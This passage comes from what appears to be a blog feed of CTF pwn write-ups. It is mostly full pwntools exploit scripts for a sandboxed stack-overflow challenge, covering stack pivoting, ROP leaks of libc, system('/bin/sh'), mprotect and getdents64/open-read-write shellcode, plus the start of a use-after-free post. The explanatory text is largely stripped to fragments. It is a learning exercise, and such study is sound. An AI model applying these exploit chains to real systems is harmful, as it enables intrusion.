rsi syscall</p><p>openread3(012)</p></blockquote><p>flagpayload&#x3D;bdeadbeef+p64(rdi)+p64(1)+p64(rsi_r15)+p64(0x404900)+p64(0x100)+p64(base+libc.sym[write])+p64(main)</p><p>flag</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306012654458.png" alt="image-20230306012654458"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./sandbox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;1.13.251.106&#x27;</span>,<span class="string">&#x27;8004&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401214&#x27;)</span></span><br><span class="line">rdi=<span class="number">0x401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0401281</span> </span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">p(<span class="string">&#x27;main&#x27;</span>,main)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&quot;puts_ad&quot;</span>,puts_ad)</span><br><span class="line"></span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">mprotect = base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;read_addr&#x27;</span>,read_addr)</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x40</span>)+p64(read_addr)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0x2</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x100</span>)+p64(base+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(main)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag?????"></a>flag?????</h1><p><a href="https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng">https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng</a><br>pdi2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec pwn3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/pwn3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x70</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sandbox0x10seccomp-toolsshellZzzROP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./flag???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(bin_sh)+p64(<span class="number">0x000000000040101a</span>)+p64(system_ad)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>shell</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306122938871.png" alt="image-20230306122938871"></p><p>gdbsystem(&#x2F;bin&#x2F;sh)</p><h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><p>Linuxmprotect()</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line">startlenbyteprot</span><br><span class="line">* start linux<span class="number">4</span>k<span class="number">0x1000b</span>yte</span><br><span class="line">* len</span><br><span class="line">* partlinux RWX</span><br></pre></td></tr></table></figure><p>shellcode</p><p>payload&#x3D;bdeadbeef+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(4096)+p64(poprdx_r12)+p64(0x7)+p64(0x6666)+p64(mprotect)+p64(main)</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306141247754.png" alt="image-20230306141247754"></p><p>rwx</p><h2 id="getdents64"><a href="#getdents64" class="headerlink" title="getdents64"></a>getdents64</h2><p>getdents64</p><ul><li>fd</li><li></li><li>4096</li><li></li></ul><p>linux lsgetdents64</p><p>stacels</p><blockquote><p>straceLinux</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ioctl(1, TCGETS, &#123;B38400 opost isig icanon echo ...&#125;) = 0</span><br><span class="line">ioctl(1, TIOCGWINSZ, &#123;ws_row=49, ws_col=102, ws_xpixel=1632, ws_ypixel=1568&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3</span><br><span class="line">newfstatat(3, &quot;&quot;, &#123;st_mode=S_IFDIR|0777, st_size=4096, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 23 entries */, 32768) = 800</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 0 entries */, 32768) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack\t  flag.txt&quot;..., 67) = 67</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack.py  get_st&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;ciscn_2019_c_1\t\t  get_started_3d&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;core\t\t\t  get_started_3dsctf_2016&quot;..., 68) = 68</span><br><span class="line">write(1, &quot;ctest\t\t\t  IDA\t\t\t\t       payload.&quot;..., 51) = 51</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><p>writepayloadbssmp_start+0x200wp</p><p>mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;mov rsi, 0x%x;push rsi; ret;syscall</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br></pre></td></tr></table></figure><p>fd4</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230307000430195.png" alt="image-20230307000430195"></p><h2 id="EXP-"><a href="#EXP-" class="headerlink" title="EXP "></a>EXP </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./grxer???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))+base</span><br><span class="line">poprsi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))+base</span><br><span class="line">poprdx_r12=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx;pop r12;ret;&#x27;</span>)))+base</span><br><span class="line">p(<span class="string">&#x27;poprdi&#x27;</span>,poprdi)</span><br><span class="line">p(<span class="string">&#x27;poprsi&#x27;</span>,poprsi)</span><br><span class="line">p(<span class="string">&#x27;poprdx&#x27;</span>,poprdx_r12)</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+base</span><br><span class="line">read_ad=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+base</span><br><span class="line">mp_start=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(<span class="number">4096</span>)+p64(poprdx_r12)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x6666</span>)+p64(mprotect)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rsi, 0x%x;push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">flag=r(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag---&gt;&#x27;</span>+flag.decode())</span><br><span class="line">flagname=<span class="string">&#x27;./flag&#x27;</span>+flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flagname)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line"><span class="comment"># sa(b&#x27;\x96\x88\n\n&#x27;,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
            <tag> Sandbox </tag>
            
            <tag> Getdents64 Leak </tag>
            
            <tag> Mprotect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Using-After-Free</title>
      <link href="/2023/03/04/Using-After-Free/"/>
      <url>/2023/03/04/Using-After-Free/</url>
      
        <content type="html"><![CDATA[<h1 id="Using-After-Free"><a href="#Using-After-Free" class="headerlink" title="Using-After-Free"></a>Using-After-Free</h1><p>freenull NULL  dangling pointer</p><span id="more"></span><h2 id="HITCON-training-lib10"><a href="#HITCON-training-lib10" class="headerlink" title="HITCON-training lib10"></a>HITCON-training lib10</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p><img src="/2023/03/04/Using-After-Free/image-20230304180356251.png" alt="image-20230304180356251"></p><p>5note,notelist(00x804A070)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> (*put)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span 